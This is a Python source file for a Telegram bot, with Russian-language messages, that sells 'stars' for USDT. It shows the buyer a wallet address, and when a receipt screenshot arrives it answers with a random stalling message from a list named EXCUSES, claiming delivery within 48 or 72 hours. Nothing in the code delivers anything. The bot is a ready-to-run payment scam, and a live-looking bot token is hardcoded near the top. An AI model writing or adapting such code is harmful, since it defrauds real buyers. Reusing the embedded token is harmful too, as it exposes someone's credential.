import asyncio
import random
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command

# ТОКЕН ВСТАВЛЕН ПРЯМО В КОД
TOKEN = "8857302639:AAGLXN4zoBp31InA3ocFKrR0cFIrZ6puOkc"

bot = Bot(token=TOKEN)
dp = Dispatcher()

WALLETS = ["TXu5abcdef1234567890"]
EXCUSES = [
    "✅ Платёж получен! Звёзды будут начислены в течение 48 часов.",
    "🔄 Технические работы. Задержка до 72 часов."
]

main_kb = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="🌟 Купить звёзды")],
        [KeyboardButton(text="🆔 Мой ID")]
    ],
    resize_keyboard=True
)

@dp.message(Command("start"))
async def start(message: types.Message):
    await message.answer(
        f"🌟 Добро пожаловать!\nВаш ID: `{message.from_user.id}`",
        parse_mode="Markdown",
        reply_markup=main_kb
    )

@dp.message(F.text == "🆔 Мой ID")
async def show_id(message: types.Message):
    bot_id = (await bot.get_me()).id
    await message.answer(
        f"🆔 Ваш ID: `{message.from_user.id}`\n🤖 ID бота: `{bot_id}`",
        parse_mode="Markdown"
    )

@dp.message(F.text == "🌟 Купить звёзды")
async def buy(message: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="100 ⭐ - 5 USDT", callback_data="buy_100")]
    ])
    await message.answer("Выберите количество:", reply_markup=kb)

@dp.callback_query(F.data == "buy_100")
async def process_buy(callback: types.CallbackQuery):
    wallet = random.choice(WALLETS)
    await callback.message.edit_text(
        f"💰 Оплатите на кошелёк:\n`{wallet}`\n\n"
        f"Пришлите скрин чека и TXID.\n\n"
        f"🆔 Ваш ID: `{callback.from_user.id}`",
        parse_mode="Markdown"
    )

@dp.message(F.photo)
async def handle_photo(message: types.Message):
    excuse = random.choice(EXCUSES)
    await message.answer(
        f"{excuse}\n\n🆔 Ваш ID: `{message.from_user.id}`",
        parse_mode="Markdown"
    )

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
